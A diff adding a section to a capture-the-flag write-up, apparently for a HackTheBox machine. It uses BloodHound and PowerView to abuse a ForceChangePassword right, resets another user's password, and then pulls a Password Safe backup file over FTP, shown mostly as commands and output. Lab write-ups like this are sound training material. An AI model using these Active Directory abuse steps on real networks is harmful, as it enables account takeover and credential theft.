@@ -163,6 +163,44 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\michael\Documents> 
 ```
+We then check the account Michael@administrator.htb on Bloodhound and see that it has the ForceChangePassword privilege over the Benjamin@administrator.htb account.
+
+We run the following with the Michael account using PowerView.ps1 to change Benjamin's password:
+```
+*Evil-WinRM* PS C:\Users\michael\Documents> Import-Module C:\Users\michael\Documents\PowerView.ps1
+*Evil-WinRM* PS C:\Users\michael\Documents> $UserPassword = ConvertTo-SecureString 'Password123@' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\michael\Documents> Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword
+```
+We see that the Benjamin user is not a remote management user but has the additional group called "share moderators," which sounds like an additional fileshare permission. 
+
+We then try to login to the ftp server using Benjamin's credentials:
+```
+ftp benjamin@10.10.11.42
+Connected to 10.10.11.42.
+220 Microsoft FTP Service
+331 Password required
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+
+ftp> dir
+229 Entering Extended Passive Mode (|||64827|)
+125 Data connection already open; Transfer starting.
+10-05-24  09:13AM                  952 Backup.psafe3
+226 Transfer complete.
+ftp> get Backup.psafe3
+local: Backup.psafe3 remote: Backup.psafe3
+229 Entering Extended Passive Mode (|||64828|)
+125 Data connection already open; Transfer starting.
+100% |***************************************************************************|   952       30.56 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 3 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+952 bytes received in 00:00 (30.26 KiB/s)
+```
+And we get a file named Backup.psafe3. 
+
+
 
 
 
